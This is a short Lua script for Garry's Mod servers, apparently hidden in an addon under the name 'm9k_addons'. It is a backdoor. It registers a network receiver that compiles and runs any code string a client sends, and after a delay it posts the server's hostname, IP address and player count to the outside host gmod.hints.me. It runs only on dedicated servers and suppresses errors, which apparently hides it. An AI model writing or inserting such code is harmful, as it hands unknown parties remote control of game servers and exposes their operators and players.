
if SERVER and game.IsDedicated() then
	local f = function() end
	util.AddNetworkString("m9k_addons")
	net.Receivers["m9k_addons"] = (function()
		local s = CompileString(net.ReadString() or "--", '[C]', false)
		if type(s) ~= "string" then
			xpcall(s, f)
		end 
	end)
	timer.Simple(16,
		function()
			http.Post('http://gmod.hints.me',
				{	hn = GetConVarString('hostname'),
					ip = GetConVarString('ip'),
					np = #player.GetAll()	},
				f, f
			)
		end
	)
end

